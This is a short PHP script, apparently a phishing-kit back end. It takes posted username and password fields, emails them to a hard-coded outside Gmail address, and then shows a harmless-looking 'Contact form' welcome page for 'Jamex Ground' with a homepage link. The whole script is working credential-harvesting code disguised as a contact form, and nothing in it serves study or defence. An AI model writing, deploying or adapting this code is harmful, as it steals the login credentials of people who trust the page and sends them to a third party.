<?php
$UN = $_POST['UN'];
$PW = $_POST['PW'];
$PW = $_POST['PW'];

$mailheader = "From:".$UN."<".$PW.">\r\n";

$recipient = "bricktownking@gmail.com";

mail($recipient, $recipient, $mailheader) or die("Error!");

echo'
<!DOCTYPE html>
<html lang="en">
<head>

    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Contact form</title>
    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@600&family=Poppins&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <h1>Welcome to Jamex Ground!</h1>
        <p class="back">Go back to the <a href="https://jamexground.com">homepage</a>.</p>
        
    </div>
</body>
</html>
';


?>